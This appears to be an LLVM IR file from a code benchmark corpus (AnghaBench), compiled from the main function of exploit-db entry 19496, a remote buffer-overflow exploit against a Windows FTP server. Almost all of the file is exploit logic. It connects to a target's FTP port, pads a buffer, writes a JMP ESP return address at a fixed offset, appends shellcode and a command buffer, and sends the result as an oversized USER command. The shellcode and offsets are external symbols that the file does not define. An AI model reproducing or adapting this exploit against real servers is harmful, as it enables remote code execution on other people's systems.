; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19496.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19496.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i32, i32, i32 }
%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [20 x i8] c"usage\0A %s HostName\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@FTP_PORT = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [33 x i8] c"Can not resolve specified host.\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@exploit_code = common dso_local global i8* null, align 8
@cmdbuf = common dso_local global i32 0, align 4
@BUFSIZE = common dso_local global i64 0, align 8
@JMP_ESP = common dso_local global i32 0, align 4
@RETADR = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [10 x i8] c"USER %s\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"PASS sample\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca [3000 x i8], align 16
  %9 = alloca [1500 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %13, 2
  br i1 %14, label %15, label %21

15:                                               ; preds = %2
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0), i8* %18)
  %20 = call i32 @exit(i32 1) #3
  unreachable

21:                                               ; preds = %2
  %22 = call i32 @bzero(%struct.sockaddr_in* %7, i32 12)
  %23 = load i32, i32* @AF_INET, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %23, i32* %24, align 4
  %25 = load i32, i32* @FTP_PORT, align 4
  %26 = call i32 @htons(i32 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %26, i32* %27, align 4
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @inet_addr(i8* %30)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %33 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %32, i32 0, i32 0
  store i32 %31, i32* %33, align 4
  %34 = icmp eq i32 %31, -1
  br i1 %34, label %35, label %59

35:                                               ; preds = %21
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 1
  %38 = load i8*, i8** %37, align 8
  %39 = call %struct.hostent* @gethostbyname(i8* %38)
  store %struct.hostent* %39, %struct.hostent** %6, align 8
  %40 = icmp eq %struct.hostent* %39, null
  br i1 %40, label %41, label %44

41:                                               ; preds = %35
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0))
  %43 = call i32 @exit(i32 1) #3
  unreachable

44:                                               ; preds = %35
  %45 = load %struct.hostent*, %struct.hostent** %6, align 8
  %46 = getelementptr inbounds %struct.hostent, %struct.hostent* %45, i32 0, i32 2
  %47 = load i32, i32* %46, align 4
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %47, i32* %48, align 4
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %50 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %49, i32 0, i32 0
  %51 = ptrtoint i32* %50 to i32
  %52 = load %struct.hostent*, %struct.hostent** %6, align 8
  %53 = getelementptr inbounds %struct.hostent, %struct.hostent* %52, i32 0, i32 1
  %54 = load i32, i32* %53, align 4
  %55 = load %struct.hostent*, %struct.hostent** %6, align 8
  %56 = getelementptr inbounds %struct.hostent, %struct.hostent* %55, i32 0, i32 0
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @memcpy(i32 %51, i32 %54, i32 %57)
  br label %59

59:                                               ; preds = %44, %21
  %60 = load i32, i32* @AF_INET, align 4
  %61 = load i32, i32* @SOCK_STREAM, align 4
  %62 = call i32 @socket(i32 %60, i32 %61, i32 0)
  store i32 %62, i32* %10, align 4
  %63 = icmp slt i32 %62, 0
  br i1 %63, label %64, label %67

64:                                               ; preds = %59
  %65 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %66 = call i32 @exit(i32 0) #3
  unreachable

67:                                               ; preds = %59
  %68 = load i32, i32* %10, align 4
  %69 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %70 = call i64 @connect(i32 %68, %struct.sockaddr* %69, i32 12)
  %71 = icmp slt i64 %70, 0
  br i1 %71, label %72, label %75

72:                                               ; preds = %67
  %73 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  %74 = call i32 @exit(i32 0) #3
  unreachable

75:                                               ; preds = %67
  br label %76

76:                                               ; preds = %89, %75
  %77 = load i32, i32* %10, align 4
  %78 = getelementptr inbounds [3000 x i8], [3000 x i8]* %8, i64 0, i64 0
  %79 = call i32 @read(i32 %77, i8* %78, i32 3000)
  store i32 %79, i32* %11, align 4
  %80 = icmp sgt i32 %79, 0
  br i1 %80, label %81, label %90

81:                                               ; preds = %76
  %82 = load i32, i32* %11, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds [3000 x i8], [3000 x i8]* %8, i64 0, i64 %83
  store i8 0, i8* %84, align 1
  %85 = getelementptr inbounds [3000 x i8], [3000 x i8]* %8, i64 0, i64 0
  %86 = call i32* @strchr(i8* %85, i8 signext 10)
  %87 = icmp ne i32* %86, null
  br i1 %87, label %88, label %89

88:                                               ; preds = %81
  br label %90

89:                                               ; preds = %81
  br label %76

90:                                               ; preds = %88, %76
  %91 = load i8*, i8** @exploit_code, align 8
  %92 = load i32, i32* @cmdbuf, align 4
  %93 = call i32 @strcat(i8* %91, i32 %92)
  %94 = getelementptr inbounds [1500 x i8], [1500 x i8]* %9, i64 0, i64 0
  %95 = load i64, i64* @BUFSIZE, align 8
  %96 = trunc i64 %95 to i32
  %97 = call i32 @memset(i8* %94, i8 signext 97, i32 %96)
  %98 = load i64, i64* @BUFSIZE, align 8
  %99 = getelementptr inbounds [1500 x i8], [1500 x i8]* %9, i64 0, i64 %98
  store i8 0, i8* %99, align 1
  %100 = load i32, i32* @JMP_ESP, align 4
  store i32 %100, i32* %12, align 4
  %101 = load i32, i32* %12, align 4
  %102 = and i32 %101, 255
  %103 = trunc i32 %102 to i8
  %104 = load i64, i64* @RETADR, align 8
  %105 = getelementptr inbounds [1500 x i8], [1500 x i8]* %9, i64 0, i64 %104
  store i8 %103, i8* %105, align 1
  %106 = load i32, i32* %12, align 4
  %107 = ashr i32 %106, 8
  %108 = and i32 %107, 255
  %109 = trunc i32 %108 to i8
  %110 = load i64, i64* @RETADR, align 8
  %111 = add i64 %110, 1
  %112 = getelementptr inbounds [1500 x i8], [1500 x i8]* %9, i64 0, i64 %111
  store i8 %109, i8* %112, align 1
  %113 = load i32, i32* %12, align 4
  %114 = ashr i32 %113, 16
  %115 = and i32 %114, 255
  %116 = trunc i32 %115 to i8
  %117 = load i64, i64* @RETADR, align 8
  %118 = add i64 %117, 2
  %119 = getelementptr inbounds [1500 x i8], [1500 x i8]* %9, i64 0, i64 %118
  store i8 %116, i8* %119, align 1
  %120 = load i32, i32* %12, align 4
  %121 = ashr i32 %120, 24
  %122 = and i32 %121, 255
  %123 = trunc i32 %122 to i8
  %124 = load i64, i64* @RETADR, align 8
  %125 = add i64 %124, 3
  %126 = getelementptr inbounds [1500 x i8], [1500 x i8]* %9, i64 0, i64 %125
  store i8 %123, i8* %126, align 1
  %127 = getelementptr inbounds [1500 x i8], [1500 x i8]* %9, i64 0, i64 0
  %128 = load i64, i64* @RETADR, align 8
  %129 = getelementptr inbounds i8, i8* %127, i64 %128
  %130 = getelementptr inbounds i8, i8* %129, i64 4
  %131 = load i8*, i8** @exploit_code, align 8
  %132 = load i8*, i8** @exploit_code, align 8
  %133 = call i32 @strlen(i8* %132)
  %134 = call i32 @strncpy(i8* %130, i8* %131, i32 %133)
  %135 = getelementptr inbounds [3000 x i8], [3000 x i8]* %8, i64 0, i64 0
  %136 = getelementptr inbounds [1500 x i8], [1500 x i8]* %9, i64 0, i64 0
  %137 = call i32 (i8*, i8*, ...) @sprintf(i8* %135, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0), i8* %136)
  %138 = load i32, i32* %10, align 4
  %139 = getelementptr inbounds [3000 x i8], [3000 x i8]* %8, i64 0, i64 0
  %140 = getelementptr inbounds [3000 x i8], [3000 x i8]* %8, i64 0, i64 0
  %141 = call i32 @strlen(i8* %140)
  %142 = call i32 @write(i32 %138, i8* %139, i32 %141)
  br label %143

143:                                              ; preds = %156, %90
  %144 = load i32, i32* %10, align 4
  %145 = getelementptr inbounds [3000 x i8], [3000 x i8]* %8, i64 0, i64 0
  %146 = call i32 @read(i32 %144, i8* %145, i32 3000)
  store i32 %146, i32* %11, align 4
  %147 = icmp sgt i32 %146, 0
  br i1 %147, label %148, label %157

148:                                              ; preds = %143
  %149 = load i32, i32* %11, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds [3000 x i8], [3000 x i8]* %8, i64 0, i64 %150
  store i8 0, i8* %151, align 1
  %152 = getelementptr inbounds [3000 x i8], [3000 x i8]* %8, i64 0, i64 0
  %153 = call i32* @strchr(i8* %152, i8 signext 10)
  %154 = icmp ne i32* %153, null
  br i1 %154, label %155, label %156

155:                                              ; preds = %148
  br label %157

156:                                              ; preds = %148
  br label %143

157:                                              ; preds = %155, %143
  %158 = getelementptr inbounds [3000 x i8], [3000 x i8]* %8, i64 0, i64 0
  %159 = call i32 @memset(i8* %158, i8 signext 0, i32 1024)
  %160 = getelementptr inbounds [3000 x i8], [3000 x i8]* %8, i64 0, i64 0
  %161 = call i32 (i8*, i8*, ...) @sprintf(i8* %160, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0))
  %162 = load i32, i32* %10, align 4
  %163 = getelementptr inbounds [3000 x i8], [3000 x i8]* %8, i64 0, i64 0
  %164 = getelementptr inbounds [3000 x i8], [3000 x i8]* %8, i64 0, i64 0
  %165 = call i32 @strlen(i8* %164)
  %166 = call i32 @write(i32 %162, i8* %163, i32 %165)
  %167 = load i32, i32* %10, align 4
  %168 = call i32 @close(i32 %167)
  %169 = load i32, i32* %3, align 4
  ret i32 %169
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(i32, i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32* @strchr(i8*, i8 signext) #1

declare dso_local i32 @strcat(i8*, i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
